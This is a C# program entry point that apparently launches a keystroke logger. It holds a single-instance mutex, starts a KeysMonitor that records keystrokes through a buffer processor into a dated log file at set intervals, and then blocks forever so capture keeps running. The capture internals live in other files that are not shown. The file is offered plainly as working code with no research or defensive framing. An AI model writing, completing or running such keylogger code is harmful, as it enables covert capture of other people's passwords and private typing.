using System;
using System.Threading;
using wls.Buffer;

namespace wls
{
    class Program
    {
        // Mutex can be made static so that GC doesn't recycle
        // same effect with GC.KeepAlive(mutex) at the end of main
        static Mutex mutex = new Mutex(false, "9FBD5D70-791F-47D0-9A10-900DCFFBC500");

        private static ManualResetEvent waitHandle = new ManualResetEvent(false);
        static void Main()
        {
            // if you like to wait a few seconds in case that the instance is just 
            // shutting down
            if (!mutex.WaitOne(TimeSpan.FromSeconds(1), false))
            {
                return;
            }

            try
            {
                var km = new KeysMonitor(new FileFlash(Config.LogFileName, Config.LogFileDatePattern),
                                         new SmartBufferProcessor())
                    {
                        FlashInterval = Config.FlashInterval
                    };
                km.Start();
                waitHandle.WaitOne();
            }
            finally
            {
                mutex.ReleaseMutex();
            }
        }
    }
}
